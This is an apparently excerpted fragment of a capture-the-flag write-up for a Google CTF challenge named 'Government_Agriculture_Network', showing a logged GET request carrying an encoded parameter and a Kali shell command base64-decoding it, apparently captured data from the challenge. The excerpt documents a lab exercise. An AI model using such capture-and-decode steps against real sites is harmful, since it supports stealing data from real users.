...
GET /1ejsfet1?e=[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]ODRDbWtRQzFWdjBCWEVUanlYTXROUXJW
...
e: [AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]ODRDbWtRQzFWdjBCWEVUanlYTXROUXJW
HEADERS
...
```console
root@kali:/media/sf_CTFs/google/Government_Agriculture_Network# echo [AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]ODRDbWtRQzFWdjBCWEVUanlYTXROUXJW | base64 -d
